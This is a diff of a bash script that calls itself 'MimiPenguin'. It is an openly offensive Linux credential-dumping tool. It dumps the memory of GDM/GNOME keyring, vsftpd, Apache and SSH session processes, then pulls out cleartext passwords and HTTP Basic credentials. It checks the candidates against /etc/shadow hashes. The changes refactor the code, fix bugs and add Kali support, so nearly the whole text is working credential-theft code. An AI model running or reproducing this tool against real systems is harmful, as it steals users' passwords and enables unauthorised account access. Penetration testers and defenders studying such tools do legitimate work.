@@ -14,12 +14,19 @@ fi
 #Store results to cleanup later
 export RESULTS=""
 
-dump_pid ()
-{
+
+# $1 = PID, $2 = output_file, $3 = operating system
+function dump_pid () {
+
+	system=$3
 	pid=$1
 	output_file=$2
-	grep -E "^[0-9a-f-]* r" /proc/$pid/maps | cut -d" " -f 1 |
-	while read memrange; do
+	if [[ $system == "kali" ]]; then
+		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack' | cut -d' ' -f 1)
+	else
+		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps | cut -d' ' -f 1)
+	fi
+	while read -r memrange; do
 		memrange_start=`echo $memrange | cut -d"-" -f 1`;
 		memrange_start=`printf "%u\n" 0x$memrange_start`;
 		memrange_stop=`echo $memrange | cut -d"-" -f 2`;
@@ -27,108 +34,107 @@ dump_pid ()
 		memrange_size=$(($memrange_stop - $memrange_start));
 		dd if=/proc/$pid/mem of=${output_file}.${pid} ibs=1 oflag=append conv=notrunc \
 			skip=$memrange_start count=$memrange_size > /dev/null 2>&1
-	done;
+	done <<< "$mem_maps"
 }
 
-parse_pass ()
-{
-#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
 
-#If hash not in dump get shadow hashes
-if [[ ! "$2" ]]; then
-		SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | egrep '^\$.\$')"
-fi
 
-#Determine password potential for each word
-while read -r line; do
-	#If hash in dump, prepare crypt line
-	if [[ "$2" ]]; then
-		#get ctype
-		CTYPE="$(echo "$2" | cut -c-3)"
-		#Escape quotes, backslashes, single quotes to pass into crypt
-		SAFE=$(echo "$line" | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
-		CRYPT="\"$SAFE\", \"$CTYPE$3\""
-		if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$2" ]]; then
-			#Find which user's password it is (useful if used more than once!)
-			USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
-			export RESULTS="$RESULTS$4			$USER:$line \n"
-		fi
-	#Else use shadow hashes
-	elif [[ $SHADOWHASHES ]]; then
-		while read -r thishash; do
-			CTYPE="$(echo "$thishash" | cut -c-3)"
-			SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
-			#Escape quotes, backslashes, single quotes to pass into crypt
-			SAFE=$(echo "$line" | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
-			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
-			if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
-				#Find which user's password it is (useful if used more than once!)
-				USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
-				export RESULTS="$RESULTS$4			$USER:$line\n"
-			fi
-		done <<< "$SHADOWHASHES"
-	#if no hash data - revert to checking probability
-	else
-		if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ ^LOGNAME= ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ UTF-8 ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ ^splayManager[0-9]$ ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ ^gkr_system_authtok$ ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ Manager\.Worker ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ /usr/share ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ /bin ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ \.so\.[0-1]$ ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ x86_64 ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ (aoao) ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		elif [[ $line =~ stuv ]]; then
-			export RESULTS="$RESULTS[LOW]$4			$line\n"
-		else
-			export RESULTS="$RESULTS[HIGH]$4			$line\n"
-		fi
+# $1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
+function parse_pass () {
+
+	#If hash not in dump get shadow hashes
+	if [[ ! "$2" ]]; then
+			SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | egrep '^\$.\$')"
 	fi
-done <<< "$1"
-}
+
+	#Determine password potential for each word
+	while read -r line; do
+		#If hash in dump, prepare crypt line
+		if [[ "$2" ]]; then
+			#get ctype
+			CTYPE="$(echo "$2" | cut -c-3)"
+			#Escape quotes, backslashes, single quotes to pass into crypt
+			SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
+			CRYPT="\"$SAFE\", \"$CTYPE$3\""
+			if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$2" ]]; then
+				#Find which user's password it is (useful if used more than once!)
+				USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
+				export RESULTS="$RESULTS$4			$USER:$line \n"
+			fi
+		#Else use shadow hashes
+		elif [[ $SHADOWHASHES ]]; then
+			while read -r thishash; do
+				CTYPE="$(echo "$thishash" | cut -c-3)"
+				SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
+				#Escape quotes, backslashes, single quotes to pass into crypt
+				SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
+				CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
+				if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
+					#Find which user's password it is (useful if used more than once!)
+					USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
+					export RESULTS="$RESULTS$4			$USER:$line\n"
+				fi
+			done <<< "$SHADOWHASHES"
+		#if no hash data - revert to checking probability
+		else
+	    patterns=("^_pammodutil.+[0-9]$"\
+	             "^LOGNAME="\
+	             "UTF-8"\
+	             "^splayManager[0-9]$"\
+	             "^gkr_system_authtok$"\
+	             "[0-9]{1,4}:[0-9]{1,4}:"\
+	             "Manager\.Worker"\
+	             "/usr/share"\
+	             "/bin"\
+	             "\.so\.[0-1]$"\
+	             "x86_64"\
+	             "(aoao)"\
+	             "stuv")
+	    export RESULTS="$RESULTS[HIGH]$4			$line\n"
+	    for pattern in $patterns;do
+	      if [[ $line =~ $pattern ]]; then
+	        export RESULTS="$RESULTS[LOW]$4			$line\n"
+	      fi
+	    done
+		fi
+	done <<< "$1"
+} # end parse_pass
+
 
 #Support Kali
 if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
 	SOURCE="[SYSTEM - GNOME]"
 	#get gdm-session-worker [pam/gdm-password] process
-	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
-	dump_pid "$PID" /tmp/dump
-	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
-	SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
-	DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
-	#Remove dupes to speed up processing
-	DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
-	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
-	
-	#cleanup
-	rm -rf "/tmp/dump.${PID}"
-fi
-
-#Support Ubuntu
-if [[ $(uname -a | awk '{print tolower($0)}') == *"ubuntu"* ]]; then
-		SOURCE="[SYSTEM - GNOME]"
-		#get /usr/bin/gnome-keyring-daemon process
-		PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk -F ' ' '{ print $1 }')"
 	#if exists aka someone logged into gnome then extract...
 	if [[ $PID ]];then
 		while read -r pid; do
-			dump_pid "$PID" /tmp/dump
+			dump_pid "$pid" /tmp/dump "kali"
+			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
+			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
+			DUMP="$(strings "/tmp/dump.${pid}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
+			DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
+			#Remove dupes to speed up processing
+			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
+			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+	
+			#cleanup
+			rm -rf "/tmp/dump.${pid}"
+		done <<< "$PID"
+	fi
+fi
+
+#Support gnome-keyring
+if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
+
+		SOURCE="[SYSTEM - GNOME]"
+		#get /usr/bin/gnome-keyring-daemon process
+		PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk -F ' ' '{ print $1 }')"
+
+	#if exists aka someone logged into gnome then extract...
+	if [[ $PID ]];then
+		while read -r pid; do
+			dump_pid "$pid" /tmp/dump
 			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/dump.${pid}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
@@ -146,11 +152,11 @@ fi
 if [[ -e "/etc/vsftpd.conf" ]]; then
 		SOURCE="[SYSTEM - VSFTPD]"
 		#get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
-		PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk 'BEGIN {FS = " " } ; { print $1 }')"
+		PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk -F ' ' '{ print $1 }')"
 	#if exists aka someone logged into FTP then extract...
 	if [[ $PID ]];then
 		while read -r pid; do
-			dump_pid "$PID" /tmp/vsftpd
+			dump_pid "$pid" /tmp/vsftpd
 			HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
@@ -168,12 +174,14 @@ fi
 if [[ -e "/etc/apache2/apache2.conf" ]]; then
 		SOURCE="[HTTP BASIC - APACHE2]"
 		#get all apache workers /usr/sbin/apache2 -k start
-		PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+		PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
 	#if exists aka apache2 running
 	if [[ "$PID" ]];then
 		#Dump all workers
 		while read -r pid; do
-			dump_pid "$PID" /tmp/apache
+			gcore -o /tmp/apache $pid > /dev/null 2>&1
+			#without gcore - VERY SLOW!
+			#dump_pid $pid /tmp/apache
 		done <<< "$PID"
 		#Get encoded creds
 		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
@@ -193,11 +201,11 @@ fi
 if [[ -e "/etc/ssh/sshd_config" ]]; then
 	SOURCE="[SYSTEM - SSH]"
 	#get all ssh tty/pts sessions - sshd: user@pts01
-	PID="$(ps -eo pid,command | egrep 'sshd:.+@' | grep -v 'grep' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+	PID="$(ps -eo pid,command | egrep 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
 	#if exists aka someone logged into SSH then dump
 	if [[ "$PID" ]];then
 		while read -r pid; do
-			dump_pid "$PID" /tmp/sshd
+			dump_pid "$pid" /tmp/sshd
 			HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/sshd.${pid}" | egrep -A 3 '^sudo.+')
@@ -209,7 +217,8 @@ if [[ -e "/etc/ssh/sshd_config" ]]; then
 		rm -rf /tmp/sshd.*
 	fi
 fi
+
 #Output results to STDOUT
 printf "MimiPenguin Results:\n"
-printf "%s" "$RESULTS" | sort -u
+printf "%b" "$RESULTS" | sort -u
 unset RESULTS
